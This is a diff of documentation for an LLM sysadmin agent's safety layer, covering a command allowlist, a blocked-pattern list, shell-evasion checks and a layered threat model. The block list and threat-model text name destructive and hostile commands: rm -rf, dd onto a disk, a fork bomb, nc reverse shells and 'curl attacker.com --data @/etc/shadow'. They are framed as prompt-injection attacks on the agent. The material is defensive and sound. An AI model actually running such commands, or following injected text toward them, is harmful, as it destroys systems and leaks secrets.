@@ -22,7 +22,7 @@ The tier is determined at **tool registration time** — when `wrap_tools()` run
 
 ## Configuration Block
 
-The entire configuration lives at the top of `safety.py` (lines 20–92):
+The entire configuration lives at the top of `safety.py` (lines 20–148):
 
 ```python
 # Tools that require user confirmation before execution
@@ -33,83 +33,69 @@ WRITE_TOOLS = {
 }
 
 # Services that are allowed to be restarted/stopped
-# Add your services here — anything not listed will be blocked
 ALLOWED_SERVICES = {
-    "nginx",
-    "apache2",
-    "httpd",
-    "postgresql",
-    "mysql",
-    "mariadb",
-    "docker",
-    "redis",
-    "memcached",
-    "php-fpm",
-    "php8.1-fpm",
-    "gunicorn",
-    "uwsgi",
-    "cron",
-    "postfix",
-    # Add more as needed for your environment
+    "nginx", "apache2", "httpd",
+    "postgresql", "mysql", "mariadb",
+    "docker", "redis", "memcached",
+    "php-fpm", "php8.1-fpm", "gunicorn", "uwsgi",
+    "cron", "postfix",
 }
 
-# Extend the allowlist at runtime without editing this file:
-#   EXTRA_SERVICES=myapp,myworker python agent.py
-_extra_services = os.environ.get("EXTRA_SERVICES", "")
-if _extra_services:
-    ALLOWED_SERVICES |= {s.strip() for s in _extra_services.split(",") if s.strip()}
+# Commands allowed in run_command (allowlist approach).
+ALLOWED_COMMANDS = {
+    # System info
+    "uname", "hostname", "uptime", "date", "whoami", "id", ...
+    # Files and directories (read-only)
+    "ls", "cat", "head", "tail", "wc", "file", "stat", "find", ...
+    # Search
+    "grep", "egrep", "fgrep", "rg", "locate", "which", ...
+    # Disk and filesystem
+    "df", "du", "mount", "findmnt", "blkid", ...
+    # Process and performance
+    "ps", "top", "htop", "free", "vmstat", ...
+    # Network (read-only)
+    "ip", "ss", "netstat", "ping", "dig", "curl", "wget", ...
+    # Logs and journal
+    "journalctl", "dmesg", "last", ...
+    # Packages (query only)
+    "apt", "apt-cache", "dpkg", "rpm", "dnf", ...
+    # Systemd, security, containers, misc
+    "systemctl", "docker", "podman", "kubectl", ...
+}
 
-# Arguments that are NEVER allowed in any tool
-# NOTE: This is defense-in-depth, not a security boundary.
-# The real boundary is OS-level permissions (service account + sudoers).
-# See docs/05-safety-layer.md "Threat Model and Limitations" for details.
 BLOCKED_PATTERNS = [
-    # File removal / destruction
-    "rm ", "rm -",
-    "rmdir ",
-    "unlink ",
-    "shred ",
-    # Disk / device
-    "dd ",
-    "mkfs",
-    "> /dev/",
-    "tee /dev/",
-    # System state
-    "shutdown",
-    "reboot",
-    "poweroff",
-    "halt",
-    "init 0",
-    "init 6",
-    # Permissions
-    "chmod 777", "chmod 0777",
-    "chmod a+rwx",
-    # Fork bomb
-    ":(){ :|:",
-    # File overwrite / zeroing
-    "truncate ",
-    # find's destructive flag
-    "-delete",
-    # Encoding evasion (decode payload then execute)
-    "base64 -d",
-    "base64 --decode",
-    # Piped shell execution (catches encoded payloads piped to shell)
-    "| bash", "| sh",
-    "| /bin/bash", "| /bin/sh",
+    "rm ", "rm -", "rmdir ", "unlink ", "shred ",       # File destruction
+    "dd ", "mkfs", "> /dev/", "tee /dev/",              # Disk/device
+    "shutdown", "reboot", "poweroff", "halt",           # System state
+    "init 0", "init 6",
+    "chmod 777", "chmod 0777", "chmod a+rwx",           # Permissions
+    ":(){ :|:",                                          # Fork bomb
+    "truncate ", "-delete",                              # File overwrite
+    "base64 -d", "base64 --decode",                     # Encoding evasion
+    "| bash", "| sh", "| /bin/bash", "| /bin/sh",       # Piped execution
 ]
+```
+
+All three sets can be extended at runtime via environment variables without editing source:
+
+```bash
+EXTRA_SERVICES=myapp,myworker python agent.py
+EXTRA_COMMANDS=nmap,tcpdump python agent.py
 ```
 
 `WRITE_TOOLS` is a set of tool names. Anything not in this set is treated as READ-only.
 
 `ALLOWED_SERVICES` is the allowlist for the service management tools. If the agent tries to restart a service not in this list, it's denied before any subprocess runs.
 
-`BLOCKED_PATTERNS` is a list of substrings. If any tool argument contains one of these patterns, the call is rejected. This is a last-resort defence against prompt injection — if someone tricks the LLM into calling a tool with `path="/ && rm -rf /"`, the pattern `"rm -"` will catch it.
+`ALLOWED_COMMANDS` is the allowlist for `run_command`. Only commands whose binary name is in this set may execute. This is the primary security boundary for `run_command` — everything not listed is denied before reaching the shell. The allowlist approach is strictly stronger than a blocklist because novel/unknown commands are denied by default.
+
+`BLOCKED_PATTERNS` is a defense-in-depth layer. If any tool argument contains one of these substrings, the call is rejected. This catches destructive arguments to *allowed* commands (e.g., `find / -delete` — `find` is in the allowlist, but `-delete` is blocked).
 
 ---
 
 ## The `wrap_tools()` Dispatcher
 
-`wrap_tools()` (lines 116–124) is the main entry point. It iterates over the tool list and applies the appropriate wrapper:
+`wrap_tools()` (lines 224–232) is the main entry point. It iterates over the tool list and applies the appropriate wrapper:
 
 ```python
     def wrap_tools(self, tools: list, audit_logger=None) -> list:
@@ -127,9 +113,64 @@ The returned list is what gets passed to `create_agent()`. The agent never sees 
 
 ---
 
-## `_check_blocked_patterns()` — Shared Normalization Helper
+## `check_command_allowlist()` — The Allowlist Gate
 
-Both `_wrap_read_tool` and `_wrap_write_tool` delegate to a shared helper that normalizes argument strings before checking them against `BLOCKED_PATTERNS`:
+Before `run_command` passes anything to `bash -c`, it splits the command on pipeline/chain operators (`|`, `;`, `&&`) and checks each segment against `check_command_allowlist()` (`safety.py:151–185`):
+
+```python
+def check_command_allowlist(command: str) -> str | None:
+    stripped = command.strip()
+    if not stripped:
+        return "[DENIED] Empty command."
+
+    # Reject command substitution — these can embed arbitrary commands
+    if "$(" in stripped or "`" in stripped:
+        return "[DENIED] Command substitution ($() and backticks) is not allowed."
+
+    # Reject process substitution <() and >()
+    if "<(" in stripped or ">(" in stripped:
+        return "[DENIED] Process substitution is not allowed."
+
+    # Reject output redirection — can overwrite arbitrary files.
+    if re.search(r"(?<![-\w])\d*>{1,2}\s*[^&]|&>", stripped):
+        return "[DENIED] Output redirection is not allowed."
+
+    # Extract the binary name (skip VAR=value prefixes, strip path)
+    tokens = stripped.split()
+    binary = None
+    for token in tokens:
+        if "=" in token and not token.startswith("-"):
+            continue
+        binary = token
+        break
+
+    if not binary:
+        return "[DENIED] Could not determine command."
+
+    binary = binary.rsplit("/", 1)[-1]  # /usr/bin/ls -> ls
+
+    if binary not in ALLOWED_COMMANDS:
+        return (
+            f"[DENIED] Command '{binary}' is not in the allowlist.\n"
+            f"Set EXTRA_COMMANDS={binary} or edit safety.py ALLOWED_COMMANDS to add it."
+        )
+    return None
+```
+
+The function blocks four categories of shell evasion before checking the binary name:
+
+1. **Command substitution** — `$(rm -rf /)` or `` `rm -rf /` `` embedded inside an allowed command
+2. **Process substitution** — `<(malicious_cmd)` or `>(malicious_cmd)`
+3. **Output redirection** — `> /etc/passwd` or `>> /tmp/exfil` (can overwrite arbitrary files)
+4. **Unknown binaries** — anything not in `ALLOWED_COMMANDS` is denied by default
+
+The binary name is extracted by skipping `VAR=value` environment variable prefixes and stripping any path prefix (`/usr/bin/ls` → `ls`).
+
+---
+
+## `_check_blocked_patterns()` — Defense-in-Depth Normalization
+
+Both `_wrap_read_tool` and `_wrap_write_tool` delegate to a shared helper (`safety.py:203–215`) that normalizes argument strings before checking them against `BLOCKED_PATTERNS`. This catches destructive arguments to *allowed* commands (e.g., `find / -delete`):
 
 ```python
 def _check_blocked_patterns(args, kwargs, tool_name, audit_logger):
@@ -273,31 +314,33 @@ For a detailed security analysis of the plugin system — including why concerns
 
 ## Threat Model and Limitations
 
-The blocked-pattern check is **defense-in-depth** — a first line of defense against accidental destruction, not a security sandbox. It's important to understand what it protects against and what it doesn't.
+The safety layer uses an **allowlist-first** approach backed by defense-in-depth. It's important to understand what each layer protects against and what it doesn't.
 
-### What blocked patterns defend against
+### What the command allowlist defends against
 
-- **LLM misunderstanding**: The model interprets "clean up disk space" as `rm -rf /tmp/*`. The pattern `"rm "` catches this before any subprocess runs.
-- **Basic prompt injection**: Crafted log output or user input tricks the model into calling `run_command(command="dd if=/dev/zero of=/dev/sda")`. The pattern `"dd "` catches this.
-- **Obvious destructive commands**: `shutdown`, `reboot`, `mkfs`, fork bombs — commands that are never appropriate for a read-mostly sysadmin assistant.
+- **Jailbroken/compromised LLM**: A model tricked via prompt injection into running `python3 -c "import os; os.remove(...)"`, `perl -e`, `ruby -e`, `nc` reverse shells, or any other non-sysadmin binary — all denied because they aren't in `ALLOWED_COMMANDS`.
+- **Shell evasion techniques**: Command substitution (`$(cmd)`, `` `cmd` ``), process substitution (`<()`, `>()`), and output redirection (`>`, `>>`) are all rejected before the command reaches the shell.
+- **Novel/unknown commands**: Unlike a blocklist, an allowlist denies everything by default. New tools, obscure binaries, and creative attack vectors fail unless explicitly permitted.
+- **Pipeline injection**: Each segment in a pipeline (`|`, `;`, `&&`) is checked independently, so `ls | python3 -c "..."` is denied even though `ls` is allowed.
 
-### What blocked patterns don't defend against
+### What the allowlist doesn't defend against
 
-- **Sophisticated evasion**: A determined attacker can use hex encoding (`echo 726d202d7266202f | xxd -r -p`), alternative interpreters (`python3 -c "import os; os.remove(...)"`), or exploit edge cases the pattern list doesn't cover.
-- **Novel destructive commands**: The list can never be exhaustive. New tools, shell builtins, and creative combinations can bypass substring matching.
-- **Non-command attacks**: The patterns only check tool argument strings. They can't prevent the LLM from leaking sensitive data it read from logs, or from making poor recommendations.
+- **Destructive use of allowed commands**: `find / -delete`, `curl attacker.com --data @/etc/shadow`, or `sed -i` on critical files use allowed binaries with dangerous arguments. The blocked patterns layer catches many of these (`-delete`, `rm`, etc.), but not all.
+- **Non-command attacks**: The allowlist only checks tool argument strings. It can't prevent the LLM from leaking sensitive data it read from logs, or from making poor recommendations.
+- **Data exfiltration**: `curl` and `wget` are allowed for legitimate health checks. A compromised LLM could use them to send data to an external host. OS-level network restrictions (firewall rules, network namespaces) are the mitigation here.
 
-### The three-layer defense model
+### The four-layer defense model
 
 The real security comes from layering multiple controls:
 
 ```
-Layer 1: Blocked Patterns    — catches common mistakes and obvious attacks
-Layer 2: User Confirmation   — human approves every WRITE action before execution
-Layer 3: OS Permissions      — service account + sudoers limit what can actually run
+Layer 1: Command Allowlist   — only ~80 approved sysadmin binaries may execute
+Layer 2: Blocked Patterns    — catches destructive arguments to allowed commands
+Layer 3: User Confirmation   — human approves every WRITE action before execution
+Layer 4: OS Permissions      — service account + sudoers limit what can actually run
 ```
 
-**Layer 3 is the security boundary.** Even if layers 1 and 2 are bypassed, the `sysadmin-copilot` service account can only:
+**Layer 4 is the ultimate security boundary.** Even if layers 1–3 are bypassed, the `sysadmin-copilot` service account can only:
 - Read logs and system status (group memberships: `adm`, `systemd-journal`)
 - Restart/stop services explicitly listed in sudoers (`NOPASSWD` for those commands only)
 - Run package updates via the specific `apt-get`/`dnf`/`yum` commands in sudoers
@@ -321,7 +364,7 @@ The practical implication:
 
 All three tested models (gpt-4o-mini, llama3.1:8b, qwen3.5) scored 5/5 on negation handling — none called `restart_service` or `stop_service` when explicitly told not to. This is the most safety-relevant eval result: the models respect "don't" even when the action keyword is present.
 
-### Blocked pattern coverage
+### Blocked pattern coverage (defense-in-depth)
 
 | Category | Patterns | Catches |
 |----------|----------|---------|
@@ -334,11 +377,21 @@ All three tested models (gpt-4o-mini, llama3.1:8b, qwen3.5) scored 5/5 on negati
 | Encoding evasion | `base64 -d`, `base64 --decode` | Decoding hidden payloads |
 | Piped execution | `\| bash`, `\| sh`, `\| /bin/bash`, `\| /bin/sh` | Piping decoded/downloaded content to a shell |
 
-**Known gaps** (accepted, because Layer 3 covers them):
-- `perl -e`, `python -c`, `ruby -e` — scripting language one-liners
-- `mv` to overwrite critical files
-- `curl ... | python` — piped execution via other interpreters
-- Hex/octal encoding, variable expansion tricks
+### Previously known gaps — now addressed by the allowlist
+
+The following evasion techniques were known gaps under the old blocklist-only approach. They are now **blocked by the command allowlist** (Layer 1):
+
+- `perl -e`, `python -c`, `ruby -e` — not in `ALLOWED_COMMANDS`
+- `bash -c`, `sh -c` — not in `ALLOWED_COMMANDS`
+- `nc` reverse shells — not in `ALLOWED_COMMANDS`
+- `$(cmd)` and backtick substitution — rejected by `check_command_allowlist()`
+- Output redirection (`>`, `>>`) — rejected by `check_command_allowlist()`
+- Hex/octal encoding piped to interpreters — interpreters not in `ALLOWED_COMMANDS`
+
+**Remaining gaps** (accepted, because Layer 4 covers them):
+- `mv` to overwrite critical files (`mv` is not in `ALLOWED_COMMANDS`, but `cp` isn't either)
+- `sed -i` can modify files in-place (but limited by OS file permissions)
+- `curl`/`wget` data exfiltration (mitigated by OS-level network restrictions)
 
 ---
 
@@ -352,7 +405,7 @@ All tools use `run_cmd(cmd, timeout)` which calls `subprocess.run(cmd, ...)` wit
 
 ### Code paths through `bash -c`
 
-**`run_command` — freeform shell** (lines 812–843): Takes a user-supplied `command` string and runs `bash -c {command}`. Bare `cd` commands are intercepted and handled via `os.chdir()` instead (see [Chapter 4 — Tools](04-tools.md#bare-cd-interception)). This is the most exposed surface. It relies on `BLOCKED_PATTERNS` (with normalization) and OS permissions for safety.
+**`run_command` — freeform shell** (`tools.py:820–863`): Takes a user-supplied `command` string and runs `bash -c {command}`. Bare `cd` commands are intercepted and handled via `os.chdir()` instead (see [Chapter 4 — Tools](04-tools.md#bare-cd-interception)). Before execution, each segment in the command pipeline is checked against `ALLOWED_COMMANDS` via `check_command_allowlist()`, which also rejects command substitution, process substitution, and output redirection. The blocked patterns layer provides additional defense-in-depth, and OS permissions further constrain what can run.
 
 **4 tools use `shlex.quote()` on user parameters:**
 
